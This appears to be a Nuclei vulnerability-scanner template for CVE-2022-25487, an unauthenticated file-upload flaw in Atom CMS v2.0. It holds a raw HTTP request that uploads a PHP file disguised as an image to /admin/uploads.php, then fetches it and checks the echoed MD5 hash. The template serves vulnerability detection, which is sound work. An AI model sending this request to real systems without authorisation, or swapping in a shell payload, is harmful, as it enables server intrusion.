http:
- extractors:
  - group: 1
    internal: true
    name: filename
    regex:
    - SET avatar = '(.*?)'
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - 7ee3686858eb89dd68ccf85f0ea03abe
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /admin/uploads.php?id=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------30623082103363803402542706041


    -----------------------------30623082103363803402542706041

    Content-Disposition: form-data; name="file"



    -----------------------------30623082103363803402542706041

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"

    Content-Type: image/jpeg



    <?php echo md5(''CVE-2022-25487'');?>

    -----------------------------30623082103363803402542706041--

    '
  - 'GET /uploads/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-25487
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:thedigitalcraft:atomcms:2.0:*:*:*:*:*:*:*
    cve-id: CVE-2022-25487
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.98459
    epss-score: 0.88802
  description: 'Atom CMS v2.0 was discovered to contain a remote code execution (RCE)
    vulnerability via /admin/uploads.php.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 2
    product: atomcms
    vendor: thedigitalcraft
    verified: true
  name: Atom CMS v2.0 - Remote Code Execution
  reference:
  - https://packetstormsecurity.com/files/166532/Atom-CMS-1.0.2-Shell-Upload.html
  - https://github.com/thedigicraft/Atom.CMS/issues/256
  - https://nvd.nist.gov/vuln/detail/CVE-2022-25487
  remediation: Fixed in version Atom CMS v2.1
  severity: critical
  tags: cve2022,cve,rce,atom,cms,unauth,packetstorm,intrusive,thedigitalcraft
